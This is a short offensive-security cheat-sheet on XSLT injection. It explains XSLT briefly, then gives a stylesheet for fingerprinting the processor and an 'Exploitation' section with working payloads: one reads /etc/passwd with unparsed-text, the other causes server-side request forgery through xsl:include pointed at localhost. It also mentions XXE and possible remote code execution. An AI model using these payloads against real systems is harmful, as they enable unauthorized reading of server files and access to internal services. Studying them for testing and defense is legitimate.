# XSLT Engines
XSLT (eXtensible Stylesheet Language Transformations) is a language used in ML document transformations.
The XML document can be transformed, or rather formatted using the XSL(T) document. The XSL document also has an xml-like structure and defines how another xml file should be transformed.

> XSLT document is in XML format and starts with the specific xsl root node "xsl:stylesheet"

## Sample XSLT Directives
```xml
<!-- a directive that means that this stylesheet should apply to any ("/"") xml nodes. -->
<xsl:template match="/">

<!--use XPATH, to the traverse XML document  -->
<td><xsl:value-of select="catalog/cd/title"/></td>

```

## Detection Sample XSLT File
```XML
<xsl:stylesheet version="1.0" 
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
<h2>XSLT identification</h2>
<b>Version:</b> <xsl:value-of select="system-property('xsl:version')" /><br/>
<b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
<b>Vendor URL:</b> 
<xsl:value-of select="systemproperty('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```

## Exploitation
```XML
<!-- File Read -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

<!-- SSRF via Include another XSLT file -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8080/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

- Some XSLT parsers are vulnerable to XXE Vulnerabilities as well

- When responding to `XSL:INCLUDE` directives, you might also try to respond with XML that contains an XXE payload. Moreover, XSLT engines might be able to execute custom code, which results in RCE!